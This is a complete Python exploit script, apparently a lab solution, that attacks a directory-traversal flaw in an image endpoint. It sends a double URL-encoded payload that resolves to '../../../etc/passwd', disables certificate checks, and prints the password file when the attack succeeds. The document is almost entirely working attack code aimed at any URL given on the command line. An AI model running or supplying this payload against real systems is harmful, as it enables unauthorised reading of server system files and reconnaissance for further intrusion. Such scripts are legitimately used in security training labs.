import sys
import requests
import urllib3 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1', 'https': 'http://127.0.0.1:8080'}

def dir_traversal(url):
    image_url = url + '/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34'

    r = requests.get(image_url, verify=False, proxies=proxies)
    if 'root:x' in r.text:
        print("[+] Exploit works.")
        print("[+] Contents of /etc/passwd:")
        print(r.text)
    else:
        print("[+] Failed.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("[+] Exploiting.......")
    dir_traversal(url)




if __name__ == "__main__":
    main()